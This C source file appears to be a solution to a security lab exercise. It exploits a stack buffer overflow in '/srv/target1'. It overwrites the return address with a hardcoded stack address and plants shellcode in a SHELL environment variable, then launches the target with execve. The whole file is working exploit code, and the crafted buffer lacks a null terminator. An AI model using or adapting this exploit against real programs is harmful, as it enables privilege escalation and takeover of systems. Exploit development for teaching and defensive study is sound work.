#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target1"

int main(void) {
    char *args[3];
    char *env[2];

    char padding[12];
    memset(padding, 'A', 12);

    char *malicious_buffer = (char *)malloc(12 + 4);
    memcpy(malicious_buffer, padding, 12);
    *(unsigned int *)(malicious_buffer + 12) = 0xffffd721;

    char shellcode_env[sizeof(shellcode) + 8];
    sprintf(shellcode_env, "SHELL=%s", shellcode);

    args[0] = TARGET;
    args[1] = malicious_buffer;
    args[2] = NULL;

    env[0] = shellcode_env;
    env[1] = NULL;

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");
    return 0;
}